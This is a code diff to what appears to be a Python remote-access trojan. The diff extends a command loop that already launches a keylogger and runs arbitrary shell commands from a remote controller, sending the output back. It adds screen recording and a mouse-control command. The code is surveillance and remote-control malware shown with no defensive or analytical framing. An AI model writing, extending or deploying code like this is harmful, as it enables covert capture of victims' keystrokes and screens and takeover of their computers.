@@ -1,5 +1,6 @@
 from client import Client
 from transfer import FileTransfer
+from screencast import Screencast
 import os
 import sys
 import subprocess
@@ -121,6 +122,10 @@ def main():
 			from keylogger import Keylogger
 			keylogger = Keylogger(client)
 			keylogger.record()
+		elif cmd == "mouse":
+			Mouse.move()
+		elif cmd == "screencast":
+			Screencast(client).record()
 		else:
 			output = subprocess.getoutput(cmd + " " + ' '.join(args))
 			client.send(output)
